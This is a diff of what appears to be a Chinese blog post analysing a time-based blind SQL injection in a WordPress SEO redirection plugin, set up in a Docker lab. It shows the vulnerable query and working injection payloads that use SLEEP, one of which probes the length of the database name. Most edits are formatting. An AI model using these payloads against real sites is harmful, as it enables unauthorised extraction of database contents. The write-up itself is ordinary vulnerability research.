@@ -13,12 +13,19 @@ comments: true
 首先说下搭建的测试环境:
 
 服务器：Apache
+
 数据库类型：MySQL
+
 数据库版本：5.7.15 
+
 数据库客户端版本：libmysql - 5.5.52
+
 PHP扩展:mysqli 
+
 PHP版本：5.6.26-0+deb8u1
+
 phpMyAdmin版本信息：4.4.14
+
 WordPress版本：4.3.6
 
 先做准备工作，在docker上部署的这个WordPress默认的链接形式是这样的：
@@ -42,7 +49,14 @@ WordPress版本：4.3.6
 
 来看看php文件里面写了什么，执行的SQL语句是这样的：
 
-<pre><code>select * from $table_name where enabled=1 and cat='link' and blog='" . get_current_blog_id() . "' and regex<>'' and $permalink_regex_options order by LENGTH(regex) desc </code></pre>
+<pre><code>
+select * from $table_name 
+where enabled=1 
+and cat='link'
+and blog='" . get_current_blog_id() . "'
+and regex<>'' 
+and $permalink_regex_options 
+order by LENGTH(regex) desc </code></pre>
 
 这里变量<code>$permalink_regex_options</code>指向了<code>('$permalink' regexp regex or '$permalink_alternative'  regexp regex )</code>。
 
@@ -53,7 +67,7 @@ WordPress版本：4.3.6
 <pre><code>select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc</code></pre>
 
 可以发现，这里<code>sleep</code>执行了两次，所以执行的时间应该在10秒以上。从数据库上跑一下，成功了，时间也没问题。
-![pic]()
+![pic](www.baidu.com)
 
 再精简一下注入语句<pre><code>') AND (SELECT * FROM (SELECT(IF(LENGTH(database())>32,SLEEP(5),0)))abc) AND ('SQL'='SQL</code></pre>
 
